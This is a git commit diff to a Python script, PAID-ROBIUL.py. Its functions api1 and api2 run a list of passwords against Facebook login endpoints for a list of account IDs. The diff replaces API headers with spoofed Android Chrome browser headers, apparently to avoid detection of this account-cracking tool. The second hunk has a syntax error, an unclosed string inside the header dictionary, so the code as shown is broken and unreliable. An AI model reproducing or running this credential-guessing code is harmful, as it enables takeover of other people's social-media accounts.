0dc44e2791eb3b9b6214f1aa3440c6a87e933dbe
Robiul-Facker <144569883+Robiul-Facker@users.noreply.github.com>
2023-09-15 08:50:47 +0600

    PAID-ROBIUL.py

--- PAID-ROBIUL.py
+++ PAID-ROBIUL.py
@@ -413,14 +413,21 @@ def api2(ids,names,passlist):
                                 'currently_logged_in_userid':'0',
                                 'fb_api_req_friendly_name':'authenticate',
                         }
-                        headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent':morshed1(),
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
+                        headers = {
+                                'authority': 'www.facebook.com',
+                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                                'accept-language': 'en-US,en;q=0.9',
+                                'cache-control': 'max-age=0',
+                                'referer': 'https://www.google.com/',
+                                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+                                'sec-ch-ua-mobile': '?1',
+                                'sec-ch-ua-platform': '"Android"',
+                                'sec-fetch-dest': 'document',
+                                'sec-fetch-mode': 'navigate',
+                                'sec-fetch-site': 'cross-site',
+                                'sec-fetch-user': '?1',
+                                'upgrade-insecure-requests': '1',
+                                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                                 }
                         url = 'https://api.facebook.com/method/auth.login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
@@ -512,13 +519,21 @@ def api1(ids,names,passlist):
                                 'fb_api_req_friendly_name':'authenticate',
                         }
                         headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent':morshed1(),
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
+                                'headers = {
+                                'authority': 'www.facebook.com',
+                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                                'accept-language': 'en-US,en;q=0.9',
+                                'cache-control': 'max-age=0',
+                                'referer': 'https://www.google.com/',
+                                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+                                'sec-ch-ua-mobile': '?1',
+                                'sec-ch-ua-platform': '"Android"',
+                                'sec-fetch-dest': 'document',
+                                'sec-fetch-mode': 'navigate',
+                                'sec-fetch-site': 'cross-site',
+                                'sec-fetch-user': '?1',
+                                'upgrade-insecure-requests': '1',
+                                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                                 }
                         url = 'https://graph.facebook.com/method/auth.login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
